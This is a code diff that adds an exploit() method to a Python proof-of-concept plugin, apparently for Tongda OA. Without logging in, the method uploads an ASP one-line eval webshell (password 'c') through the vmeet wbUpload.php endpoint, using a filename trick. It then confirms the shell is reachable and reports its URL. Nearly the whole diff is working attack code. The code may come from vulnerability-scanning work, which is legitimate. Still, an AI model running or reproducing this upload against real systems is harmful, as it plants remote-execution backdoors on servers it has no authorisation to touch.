@@ -59,7 +59,37 @@ testvul...\r
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.verify()
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+            
+            #refer: http://www.wooyun.org/bugs/wooyun-2013-037642
+            hh = hackhttp.hackhttp()
+            post_data = '''
+------WebKitFormBoundaryUynkBEtg4g2sRTR3\r
+Content-Disposition: form-data; name="Filedata"; filename="temp.jpg"\r
+Content-Type: image/jpeg\r
+\r
+testvul...\r
+<%eval request("c")%>\r
+------WebKitFormBoundaryUynkBEtg4g2sRTR3--\r
+'''
+            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUynkBEtg4g2sRTR3'
+            upload_url = self.target + '/general/vmeet/wbUpload.php?fileName=testvul.php+'
+            #proxy = ('127.0.0.1', 8887)
+            code, head, res, errcode, _ = hh.http(upload_url, post=post_data, header = content_type)
+            #print head
+            if code != 200:
+                return False
+            verify_url = self.target + '/general/vmeet/wbUpload/testvul.php'
+            code, head, res, errcode, _ = hh.http(verify_url)
+            if code == 200 and 'testvul...' in res:
+                #security_hole(arg + '：通达oa无需登录getshell')
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
+                    target=self.target, name=self.vuln.name, url=verify_url))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
